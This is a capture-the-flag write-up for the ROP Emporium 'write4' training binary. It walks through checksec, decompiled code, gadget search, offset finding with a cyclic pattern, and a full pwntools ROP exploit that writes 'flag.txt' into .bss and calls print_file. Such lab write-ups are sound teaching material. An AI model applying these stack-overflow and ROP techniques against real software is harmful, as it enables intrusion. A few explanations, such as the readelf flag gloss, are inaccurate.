# write4

## First Look

First, we check what security mitigations are enabled in the binary.
We see that has `Partial RELRO`, so we can still overwrite the **GOT (Global Offset Table)**, but we don't care about that for this attack.
`No canary found` (**stack canary**), so we don't have to leak or brute-force them in order to perform a buffer overflow.
And final `No PIE`, meaning the binary isn't **Position-independent executable** and the memory layout will remain consistent across executions, so we can hardcode binary's addresses without any problem.

```sh
$ pwn checksec write4
[*] '/home/vein/sec/rop_emporium/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

When we run the binary normally, it just takes an input and then terminates.

```sh
$ ./write4
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> testing
Thank you!
```

## Analysis

We opened the program in IDA and saw that the `pwnme` function is called by `main` but we can't see what actual does cause it's been called threw **Procedure Linkage Table** (PLT).
Simply, the PLT's main job is to help the program call functions from shared libraries without knowing their exact memory address at compile time.
So, we will reverse the given library, `libwrite4.so`

`pwnme` function from **write4** binary:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  pwnme(argc, argv, envp);
  return 0;
}
```

`pwnme` function from **libwrite4.so** library:
```c
int pwnme()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  puts("write4 by ROP Emporium");
  puts("x86_64\n");
  memset(s, 0, sizeof(s));
  puts("Go ahead and give me the input already!\n");
  printf("> ");
  read(0, s, 0x200uLL);
  return puts("Thank you!");
}
```

We can clearly see the vulnerability in the code. Our buffer is only 32 bytes and the read allows to read up to 512 bytes (0x200 in hex). So we have a buffer overflow here.  

Our goal is to print the flag but this time we haven't any `/bin/cat flag.txt` string like the previous time. We have a `usefulFunction` that prints a file. 
The idea here, as the description states, is to pass the string "flag.txt" to the `print_file` function so that it can be printed. 
So, firstly, we must pass the string into the `.bss` or `.data` section, which has **read-write** permissions, allowing us to write to them without any problems . These sections are basically for initializing/uninitializing variables.
**`.bss`**: For uninitialized data (zero-filled)
**`.data`**: For initialized data (contains actual values)

```sh
$ readelf -SW write4 | grep -E '\.bss|\.data'
  [23] .data             PROGBITS        0000000000601028 001028 000010 00  WA  0   0  8
  [24] .bss              NOBITS          0000000000601038 001038 000008 00  WA  0   0  1
```
`-SW` flags stand for **Strings** and **Write** 

`usefulFunction`:
```c
__int64 usefulFunction()
{
  return print_file("nonexistent");
}
```

For this type of attack, we will need some gadgets. The binary has a `usefulGadgets` function that provide for us a move gadget. We can see it with **pwndbg**:
```asm
pwndbg> disassemble usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:     ret
   0x000000000040062c <+4>:     nop    DWORD PTR [rax+0x0]
```
We also need some pop gadgets to store our variables, especially **pop rdi** and **pop r14; pop r15**:
```asm
$ ropper -f write4 --search pop | grep -E 'r14|rdi'
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop
[INFO] File: write4
0x000000000040068c: pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068e: pop r13; pop r14; pop r15; ret;
0x0000000000400690: pop r14; pop r15; ret;
0x000000000040068b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
0x000000000040068f: pop rbp; pop r14; pop r15; ret;
0x0000000000400693: pop rdi; ret;
0x000000000040068d: pop rsp; pop r13; pop r14; pop r15; ret;
```
So, those are all the gadgets we needed. The idea here is to:

- **pop the `.bss` section into `r14`,**
- **pop the string `'flag.txt'` into `r15`,** then we
- **mov QWORD PTR [r14], r15** (so we move `'flag.txt'` into `.bss`),
- **pop `r15` into `.bss`,**
- and finally, **pop `rdi` into `.bss`** (which is where the string is located), and then pass it to the **`print_file`** function

f you want to learn more about how x64 assembly registers work, here is a good paper that explains them:
https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf
## Exploit

Before we procced to our attack we must find the offset to the instruction pointer (RIP) to be able to redirect program execution to wherever we want. 
For this we will use pwndbg and create some De Bruijn Sequences. De Bruijn Sequences just does the work much easier. 
More about it : https://ir0nstone.gitbook.io/notes/binexp/stack/de-bruijn-sequences

```asm
pwndbg> r
Starting program: /home/vein/sec/rop_emporium/write4/write4
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7c00942 in pwnme () from ./libwrite4.so
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
 RAX  0xb
 RBX  0x7fffffffdc48 —▸ 0x7fffffffded0 ◂— '/home/vein/sec/rop_emporium/write4/write4'
 RCX  0x7ffff7b0fd90 (write+16) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7ffff7bf3710 (_IO_stdfile_1_lock) ◂— 0
 RSI  0x7ffff7bf2643 (_IO_2_1_stdout_+131) ◂— 0xbf3710000000000a /* '\n' */
 R8   0x4006a0 (__libc_csu_fini) ◂— repz ret
 R9   0x7ffff7fcbe20 (_dl_fini) ◂— push rbp
 R10  0x7ffff7a25a00 ◂— 0x10001200001be4
 R11  0x202
 R12  0
 R13  0x7fffffffdc58 —▸ 0x7fffffffdefa ◂— 'SHELL=/bin/bash'
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R15  0
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffdb28 ◂— 0x6161616161616166 ('faaaaaaa')
 RIP  0x7ffff7c00942 (pwnme+152) ◂— ret
─────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────
 ► 0x7ffff7c00942 <pwnme+152>    ret                                <0x6161616161616166>
    ↓



──────────────────────────────────────────[ STACK ]───────────────────────────────────────────
00:0000│ rsp 0x7fffffffdb28 ◂— 0x6161616161616166 ('faaaaaaa')
01:0008│     0x7fffffffdb30 ◂— 0x6161616161616167 ('gaaaaaaa')
02:0010│     0x7fffffffdb38 ◂— 0x7f0a61616168
03:0018│     0x7fffffffdb40 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdc38 ◂— 0x38 /* '8' */
04:0020│     0x7fffffffdb48 —▸ 0x400607 (main) ◂— push rbp
05:0028│     0x7fffffffdb50 ◂— 0x100400040 /* '@' */
06:0030│     0x7fffffffdb58 —▸ 0x7fffffffdc48 —▸ 0x7fffffffded0 ◂— '/home/vein/sec/rop_emporium/write4/write4'
07:0038│     0x7fffffffdb60 —▸ 0x7fffffffdc48 —▸ 0x7fffffffded0 ◂— '/home/vein/sec/rop_emporium/write4/write4'
────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────
 ► 0   0x7ffff7c00942 pwnme+152
   1 0x6161616161616166
   2 0x6161616161616167
   3   0x7f0a61616168
   4   0x7fffffffdc30
   5         0x400607 main
──────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l 0x6161616161616166
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

So the the offset to RIP is 40 bytes and now we can procced to our final payload.

Here my exploit script:
```python
#!/usr/bin/env python3
from pwn import *
  
elf = context.binary = ELF('./write4', checksec=False)
p = process()
#p = gdb.debug(elf.path, gdbscript='''break main, c''')
context.log_level = 'debug'
  
padding = b'a' * 40
  
# usefulGadgets
mov_r14_r15 = p64(0x400628)      # mov QWORD PTR [r14],r15
pop_r14_pop_r15 = p64(0x400690)  # pop r14; pop r15; ret;
pop_rdi = p64(0x400693)          # pop rdi; ret;
pop_r15 = p64(0x400692)          # pop r15; ret;

# useful ELF sections
bss_addr = p64(elf.bss())
# .data section works also
#data_addr = p64(0x0000000000601028) # .data addr

# print_file()
print_file = p64(elf.sym.print_file)

# first we want to mov string "flag.txt" into .bss section
# to be able to call it later as a parameter to the the print_file 
# function then we overflow the buffer with 40 bytes to redirect 
# program execution to print_file
payload =  padding
payload += pop_r14_pop_r15
payload += bss_addr
payload += b'flag.txt'

payload += mov_r14_r15
payload += pop_r15
payload += bss_addr

payload += pop_rdi
payload += bss_addr
payload += print_file
  
p.sendlineafter(b'> ', payload)
print(p.recvall())
```

```sh
$ ./exploit.py
[+] Starting local process '/home/vein/sec/rop_emporium/write4/write4': pid 42200
[+] Receiving all data: Done (33B)
[*] Stopped process '/home/vein/sec/rop_emporium/write4/write4' (pid 42200)
b'ROPE{a_placeholder_32byte_flag!}\n'
```
